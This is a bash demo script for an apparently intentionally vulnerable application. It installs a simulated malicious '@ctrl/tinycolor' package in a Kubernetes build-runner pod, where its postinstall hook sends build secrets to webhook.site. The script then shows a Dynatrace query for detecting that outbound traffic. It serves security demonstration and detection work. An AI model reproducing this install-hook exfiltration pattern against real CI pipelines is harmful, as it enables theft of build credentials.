#!/usr/bin/env bash
set -euo pipefail

NAMESPACE="ci-cd"
POD_NAME=$(kubectl get pods -n "$NAMESPACE" -l app.kubernetes.io/name=build-runner -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

if [ -z "$POD_NAME" ]; then
  echo "Error: build-runner pod not found in $NAMESPACE namespace"
  echo "Enable buildRunner in values.yaml and deploy: helm upgrade unguard ./chart --set buildRunner.enabled=true"
  exit 1
fi

echo "=== CI/CD Supply Chain Attack Demo ==="
echo "Build runner pod: $POD_NAME"
echo ""
echo "Step 1: Creating package.json with @ctrl/tinycolor dependency..."
kubectl exec "$POD_NAME" -n "$NAMESPACE" -- sh -c '
  cd /workspace
  cat > package.json <<EOF
{
  "name": "demo-app",
  "version": "1.0.0",
  "dependencies": {
    "@ctrl/tinycolor": "file:/opt/malware/ctrl-tinycolor-sim"
  }
}
EOF
  echo "package.json created:"
  cat package.json
'

echo ""
echo "Step 2: Running npm install (triggers postinstall exfiltration)..."
echo "Watch for: @ctrl/tinycolor postinstall: exfiltrating N build secrets"
echo ""

kubectl exec "$POD_NAME" -n "$NAMESPACE" -- sh -c '
  cd /workspace
  rm -rf node_modules package-lock.json
  npm install --foreground-scripts 2>&1
'

echo ""
echo "Step 3: Check Dynatrace for outbound POST spans from unguard-build-runner"
echo "  DQL query:"
echo "    fetch spans, from:now() - 5m"
echo "    | filter service.name == \"unguard-build-runner\""
echo "    | filter span.kind == \"client\""
echo "    | fields timestamp, span.name, url.full, http.request.method, http.response.status_code"
echo "    | sort timestamp desc"
echo ""
echo "Done. Check webhook.site for exfiltrated secrets."
